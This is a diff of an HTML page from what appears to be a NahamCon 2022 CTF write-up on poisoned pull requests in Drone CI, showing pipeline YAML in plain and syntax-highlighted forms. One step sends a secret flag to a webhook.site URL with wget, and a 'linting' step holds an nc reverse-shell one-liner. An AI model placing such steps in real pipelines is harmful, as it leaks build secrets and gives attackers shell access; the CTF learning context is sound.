-<pre class="codehilite"><code class="language-yml">---
-kind: pipeline
-type: exec
-name: test pipeline non-master
+<div class="codehilite">
+ <pre><span></span><code><span class="o">---</span><span class="w"></span>
+<span class="n">kind</span><span class="o">:</span><span class="w"> </span><span class="n">pipeline</span><span class="w"></span>
+<span class="kr">type</span><span class="o">:</span><span class="w"> </span><span class="n">exec</span><span class="w"></span>
+<span class="n">name</span><span class="o">:</span><span class="w"> </span><span class="n">test</span><span class="w"> </span><span class="n">pipeline</span><span class="w"> </span><span class="n">non</span><span class="o">-</span><span class="n">master</span><span class="w"></span>
 
-platform:
-  os: linux
-  arch: amd64
+<span class="n">platform</span><span class="o">:</span><span class="w"></span>
+<span class="w">  </span><span class="n">os</span><span class="o">:</span><span class="w"> </span><span class="n">linux</span><span class="w"></span>
+<span class="w">  </span><span class="n">arch</span><span class="o">:</span><span class="w"> </span><span class="n">amd64</span><span class="w"></span>
 
-steps:
-  - name: non-master
-    commands:
-      - echo "Running from the $DRONE_BRANCH branch"
-    environment:
-      FLAG:
-        from_secret: flag
-trigger:
-  branch:
-    exclude:
-      - master
+<span class="n">steps</span><span class="o">:</span><span class="w"></span>
+<span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="n">name</span><span class="o">:</span><span class="w"> </span><span class="n">non</span><span class="o">-</span><span class="n">master</span><span class="w"></span>
+<span class="w">    </span><span class="n">commands</span><span class="o">:</span><span class="w"></span>
+<span class="w">      </span><span class="o">-</span><span class="w"> </span><span class="n">echo</span><span class="w"> </span><span class="s">"Running from the $DRONE_BRANCH branch"</span><span class="w"></span>
+<span class="w">    </span><span class="n">environment</span><span class="o">:</span><span class="w"></span>
+<span class="w">      </span><span class="n">FLAG</span><span class="o">:</span><span class="w"></span>
+<span class="w">        </span><span class="n">from_secret</span><span class="o">:</span><span class="w"> </span><span class="n">flag</span><span class="w"></span>
+<span class="n">trigger</span><span class="o">:</span><span class="w"></span>
+<span class="w">  </span><span class="n">branch</span><span class="o">:</span><span class="w"></span>
+<span class="w">    </span><span class="n">exclude</span><span class="o">:</span><span class="w"></span>
+<span class="w">      </span><span class="o">-</span><span class="w"> </span><span class="n">master</span><span class="w"></span>
 
----
-kind: pipeline
-type: exec
-name: test pipeline master
+<span class="o">---</span><span class="w"></span>
+<span class="n">kind</span><span class="o">:</span><span class="w"> </span><span class="n">pipeline</span><span class="w"></span>
+<span class="kr">type</span><span class="o">:</span><span class="w"> </span><span class="n">exec</span><span class="w"></span>
+<span class="n">name</span><span class="o">:</span><span class="w"> </span><span class="n">test</span><span class="w"> </span><span class="n">pipeline</span><span class="w"> </span><span class="n">master</span><span class="w"></span>
 
-platform:
-  os: linux
-  arch: amd64
+<span class="n">platform</span><span class="o">:</span><span class="w"></span>
+<span class="w">  </span><span class="n">os</span><span class="o">:</span><span class="w"> </span><span class="n">linux</span><span class="w"></span>
+<span class="w">  </span><span class="n">arch</span><span class="o">:</span><span class="w"> </span><span class="n">amd64</span><span class="w"></span>
 
-steps:
-  - name: master
-    commands:
-      - echo "Running from the $DRONE_BRANCH branch"
-      - echo "Flag -&gt; $FLAG"
-      - wget "https://webhook.site/c6db1a4c-adad-4d53-b47e-3eee94940202/?flag=$FLAG"
-    environment:
-      FLAG:
-        from_secret: flag
-trigger:
-  branch:
-    - master
+<span class="n">steps</span><span class="o">:</span><span class="w"></span>
+<span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="n">name</span><span class="o">:</span><span class="w"> </span><span class="n">master</span><span class="w"></span>
+<span class="w">    </span><span class="n">commands</span><span class="o">:</span><span class="w"></span>
+<span class="w">      </span><span class="o">-</span><span class="w"> </span><span class="n">echo</span><span class="w"> </span><span class="s">"Running from the $DRONE_BRANCH branch"</span><span class="w"></span>
+<span class="w">      </span><span class="o">-</span><span class="w"> </span><span class="n">echo</span><span class="w"> </span><span class="s">"Flag -&gt; $FLAG"</span><span class="w"></span>
+<span class="w">      </span><span class="o">-</span><span class="w"> </span><span class="n">wget</span><span class="w"> </span><span class="s">"https://webhook.site/c6db1a4c-adad-4d53-b47e-3eee94940202/?flag=$FLAG"</span><span class="w"></span>
+<span class="w">    </span><span class="n">environment</span><span class="o">:</span><span class="w"></span>
+<span class="w">      </span><span class="n">FLAG</span><span class="o">:</span><span class="w"></span>
+<span class="w">        </span><span class="n">from_secret</span><span class="o">:</span><span class="w"> </span><span class="n">flag</span><span class="w"></span>
+<span class="n">trigger</span><span class="o">:</span><span class="w"></span>
+<span class="w">  </span><span class="n">branch</span><span class="o">:</span><span class="w"></span>
+<span class="w">    </span><span class="o">-</span><span class="w"> </span><span class="n">master</span><span class="w"></span>
 </code></pre>
+</div>
 <p>
  <img alt="" class="center" src="/images/writeups/nahamcon-2022/poisoned_pr.png"/>
 </p>
@@ -1459,7 +1496,7 @@ trigger:
 </div>
 </div>
 </section>
-<section class="wrapper style1 alt">
+<section class="wrapper style5 alt">
 <div class="inner">
 <div class="content">
 
@@ -1566,20 +1603,22 @@ trigger:
   </code>
  </strong>
 </p>
-<pre class="codehilite"><code class="language-yml">---
-kind: pipeline
-type: exec
-name: default
+<div class="codehilite">
+ <pre><span></span><code><span class="nt">---</span><span class="w"></span>
+<span class="nt">kind</span><span class="o">:</span><span class="w"> </span><span class="nt">pipeline</span><span class="w"></span>
+<span class="nt">type</span><span class="o">:</span><span class="w"> </span><span class="nt">exec</span><span class="w"></span>
+<span class="nt">name</span><span class="o">:</span><span class="w"> </span><span class="nt">default</span><span class="w"></span>
 
-platform:
-  os: linux
-  arch: amd64
+<span class="nt">platform</span><span class="o">:</span><span class="w"></span>
+<span class="w">  </span><span class="nt">os</span><span class="o">:</span><span class="w"> </span><span class="nt">linux</span><span class="w"></span>
+<span class="w">  </span><span class="nt">arch</span><span class="o">:</span><span class="w"> </span><span class="nt">amd64</span><span class="w"></span>
 
-steps:
-  - name: linting
-    commands:
-      - rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;YOUR IP&gt; &lt;YOUR PORT&gt; &gt;/tmp/f
+<span class="nt">steps</span><span class="o">:</span><span class="w"></span>
+<span class="w">  </span><span class="nt">-</span><span class="w"> </span><span class="nt">name</span><span class="o">:</span><span class="w"> </span><span class="nt">linting</span><span class="w"></span>
+<span class="w">    </span><span class="nt">commands</span><span class="o">:</span><span class="w"></span>
+<span class="w">      </span><span class="nt">-</span><span class="w"> </span><span class="nt">rm</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="o">/</span><span class="nt">tmp</span><span class="o">/</span><span class="nt">f</span><span class="o">;</span><span class="nt">mkfifo</span><span class="w"> </span><span class="o">/</span><span class="nt">tmp</span><span class="o">/</span><span class="nt">f</span><span class="o">;</span><span class="nt">cat</span><span class="w"> </span><span class="o">/</span><span class="nt">tmp</span><span class="o">/</span><span class="nt">f</span><span class="o">|/</span><span class="nt">bin</span><span class="o">/</span><span class="nt">sh</span><span class="w"> </span><span class="nt">-i</span><span class="w"> </span><span class="nt">2</span><span class="o">&gt;&amp;</span><span class="nt">1</span><span class="o">|</span><span class="nt">nc</span><span class="w"> </span><span class="o">&lt;</span><span class="nt">YOUR</span><span class="w"> </span><span class="nt">IP</span><span class="o">&gt;</span><span class="w"> </span><span class="o">&lt;</span><span class="nt">YOUR</span><span class="w"> </span><span class="nt">PORT</span><span class="o">&gt;</span><span class="w"> </span><span class="o">&gt;/</span><span class="nt">tmp</span><span class="o">/</span><span class="nt">f</span><span class="w"></span>
 </code></pre>
+</div>
 <p>
  However, due to laziness doing this writeup and not bothering to turn on my attack infra I will just tell you the juicy details. When you check the
  <code>
@@ -1667,7 +1706,7 @@ steps:
 </div>
 </div>
 </section>
-<section class="wrapper style5 ">
+<section class="wrapper style1 ">
 <div class="inner">
 <div class="content">
 
@@ -1677,7 +1716,7 @@ steps:
 </div>
 </div>
 </section>
-<section class="wrapper style6 alt">
+<section class="wrapper style2 alt">
 <div class="inner">
 <div class="content">
 
@@ -1733,8 +1772,10 @@ steps:
 <p>
  <img alt="" class="center" src="/images/writeups/nahamcon-2022/degradation_nani.png"/>
 </p>
-<pre class="codehilite"><code>/usr/lib/x86_64-linux-gnu/security
+<div class="codehilite">
+ <pre><span></span><code>/usr/lib/x86_64-linux-gnu/security
 </code></pre>
+</div>
 <p>
  <em>
   That is so sus
@@ -1803,7 +1844,7 @@ steps:
 </div>
 </div>
 </section>
-<section class="wrapper style1 ">
+<section class="wrapper style5 ">
 <div class="inner">
 <div class="content">
 
